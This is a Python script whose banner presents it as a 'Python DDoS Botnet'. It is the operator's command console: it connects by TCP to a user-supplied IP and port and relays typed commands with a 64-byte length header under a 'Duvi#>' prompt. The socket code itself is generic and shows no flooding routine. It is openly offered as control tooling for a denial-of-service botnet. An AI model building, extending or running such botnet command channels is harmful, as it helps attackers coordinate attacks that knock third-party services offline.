#Author: Menesay

import socket

print("#########################################")
print("#           Python DDoS Botnet          #")
print("#             Author: Menesay           #")
print("#                  2022                 #")
print("#########################################")

HEADER = 64
PORT = int(input("PORT: "))
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"
SERVER = str(input("IP: "))
#SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def send(msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    client.send(send_length)
    client.send(message)
    print(client.recv(2048).decode(FORMAT))
   

def main():
    input_=""
    print("quit for quit")
    while True:
        print("Duvi#> ", end="")
        input_ = input()
        send(input_)

        if input_ == "quit":
            break

    send(DISCONNECT_MESSAGE)

if __name__ == "__main__":
    main()
